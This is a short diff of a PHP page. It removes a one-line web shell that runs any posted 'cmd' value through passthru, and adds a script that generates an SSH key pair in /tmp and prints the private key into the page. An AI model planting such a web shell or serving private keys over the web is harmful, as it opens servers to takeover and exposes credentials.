@@ -1,7 +1,11 @@
-<form action="" method="post">
- <input type="text" name="cmd" />
- <input type="submit" value=".:"/>
-</form>
 <pre>
-<?php echo passthru($_POST["cmd"]); ?>
+<?php
+ $arq = rand();
+
+ echo passthru("
+  ssh-keygen -f /tmp/$arq -t rsa -N ''
+  cat /tmp/$arq;
+  cat /tmp/$arq.pub;
+ ");
+?>
 </pre>
